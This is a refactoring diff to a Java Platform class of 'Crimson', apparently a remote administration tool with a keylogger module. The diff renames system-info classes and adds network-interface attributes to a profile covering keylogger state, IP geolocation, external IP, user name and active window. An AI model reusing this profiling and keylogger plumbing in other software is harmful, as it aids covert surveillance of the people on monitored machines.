@@ -21,19 +21,19 @@ package com.subterranean_security.crimson.core.platform;
 import com.subterranean_security.crimson.client.Client;
 import com.subterranean_security.crimson.client.modules.Keylogger;
 import com.subterranean_security.crimson.core.Common;
-import com.subterranean_security.crimson.core.Common.Instance;
-import com.subterranean_security.crimson.core.platform.info.CLIENT;
 import com.subterranean_security.crimson.core.platform.info.CPU;
+import com.subterranean_security.crimson.core.platform.info.CRIMSON;
 import com.subterranean_security.crimson.core.platform.info.DISP;
-import com.subterranean_security.crimson.core.platform.info.IPLocation;
-import com.subterranean_security.crimson.core.platform.info.Java;
-import com.subterranean_security.crimson.core.platform.info.Linux;
-import com.subterranean_security.crimson.core.platform.info.Mobo;
-import com.subterranean_security.crimson.core.platform.info.Net;
+import com.subterranean_security.crimson.core.platform.info.IPLOC;
+import com.subterranean_security.crimson.core.platform.info.JAVA;
+import com.subterranean_security.crimson.core.platform.info.LIN;
+import com.subterranean_security.crimson.core.platform.info.MOBO;
+import com.subterranean_security.crimson.core.platform.info.NET;
+import com.subterranean_security.crimson.core.platform.info.NIC;
 import com.subterranean_security.crimson.core.platform.info.OS;
 import com.subterranean_security.crimson.core.platform.info.OS.OSFAMILY;
 import com.subterranean_security.crimson.core.platform.info.RAM;
-import com.subterranean_security.crimson.core.platform.info.User;
+import com.subterranean_security.crimson.core.platform.info.USER;
 import com.subterranean_security.crimson.core.platform.info.WIN;
 import com.subterranean_security.crimson.core.profile.SimpleAttribute;
 import com.subterranean_security.crimson.core.proto.Delta.EV_ProfileDelta;
@@ -44,7 +44,7 @@ public final class Platform {
 	private Platform() {
 	}
 
-	public static final ARCH javaArch = Java.getARCH();
+	public static final ARCH javaArch = JAVA.getARCH();
 	public static final OSFAMILY osFamily = OS.getFamily();
 
 	public enum ARCH {
@@ -90,6 +90,7 @@ public final class Platform {
 
 		info.addAllGroupAttr(CPU.getAttributes());
 		info.addAllGroupAttr(DISP.getAttributes());
+		info.addAllGroupAttr(NIC.getAttributes());
 
 		return info.build();
 	}
@@ -107,11 +108,11 @@ public final class Platform {
 		case CLIENT_VERSION:
 			return Common.version;
 		case CLIENT_BASE_PATH:
-			return CLIENT.getBasePath();
+			return CRIMSON.getBasePath();
 		case CLIENT_INSTALL_DATE:
-			return CLIENT.getInstallDate();
+			return CRIMSON.getInstallDate();
 		case CLIENT_STATUS:
-			return CLIENT.getStatus();
+			return CRIMSON.getStatus();
 		case KEYLOGGER_STATE:
 			State s = null;
 			if (Keylogger.isInstalled()) {
@@ -125,57 +126,57 @@ public final class Platform {
 		case KEYLOGGER_TRIGGER_VALUE:
 			return "" + Client.ic.getKeyloggerFlushValue();
 		case IPLOC_CITY:
-			return IPLocation.getCity();
+			return IPLOC.getCity();
 		case IPLOC_COUNTRY:
-			return IPLocation.getCountry();
+			return IPLOC.getCountry();
 		case IPLOC_COUNTRYCODE:
-			return IPLocation.getCountryCode();
+			return IPLOC.getCountryCode();
 		case IPLOC_LATITUDE:
-			return IPLocation.getLatitude();
+			return IPLOC.getLatitude();
 		case IPLOC_LONGITUDE:
-			return IPLocation.getLongitude();
+			return IPLOC.getLongitude();
 		case IPLOC_REGION:
-			return IPLocation.getRegion();
+			return IPLOC.getRegion();
 		case JAVA_ARCH:
-			return Java.getArch();
+			return JAVA.getArch();
 		case JAVA_PATH:
-			return Java.getHome();
+			return JAVA.getHome();
 		case JAVA_START_TIME:
-			return Java.getStartTime();
+			return JAVA.getStartTime();
 		case JAVA_VENDOR:
-			return Java.getVendor();
+			return JAVA.getVendor();
 		case JAVA_VERSION:
-			return Java.getVersion();
+			return JAVA.getVersion();
 		case LINUX_DISTRO:
-			return Linux.getDistro();
+			return LIN.getDistro();
 		case LINUX_KERNEL:
-			return Linux.getKernel();
+			return LIN.getKernel();
 		case LINUX_PACKAGES:
-			return Linux.getPackages();
+			return LIN.getPackages();
 		case LINUX_SHELL:
-			return Linux.getShell();
+			return LIN.getShell();
 		case LINUX_TERMINAL:
-			return Linux.getTerminal();
+			return LIN.getTerminal();
 		case LINUX_WM:
-			return Linux.getWM();
+			return LIN.getWM();
 		case META_FIRST_CONTACT:
 			break;
 		case MOBO_MANUFACTURER:
-			return Mobo.getManufacturer();
+			return MOBO.getManufacturer();
 		case MOBO_MODEL:
-			return Mobo.getModel();
+			return MOBO.getModel();
 		case NET_DNS1:
-			return Net.getDNS1();
+			return NET.getDNS1();
 		case NET_DNS2:
-			return Net.getDNS2();
+			return NET.getDNS2();
 		case NET_EXTERNALIP:
-			return Net.getExternalIP();
+			return NET.getExternalIP();
 		case NET_FQDN:
-			return Net.getFQDN();
+			return NET.getFQDN();
 		case NET_DEFAULT_GATEWAY:
-			return Net.getDefaultGateway();
+			return NET.getDefaultGateway();
 		case NET_HOSTNAME:
-			return Net.getHostname();
+			return NET.getHostname();
 		case OS_ACTIVE_WINDOW:
 			return OS.getActiveWindow();
 		case OS_ARCH:
@@ -203,11 +204,11 @@ public final class Platform {
 		case RAM_USAGE:
 			return RAM.getUsage();
 		case USER_HOME:
-			return User.getHome();
+			return USER.getHome();
 		case USER_NAME:
-			return User.getName();
+			return USER.getName();
 		case USER_STATUS:
-			return User.getStatus();
+			return USER.getStatus();
 		case WIN_IE_VERSION:
 			return WIN.getIEVersion();
 		case WIN_INSTALLDATE:
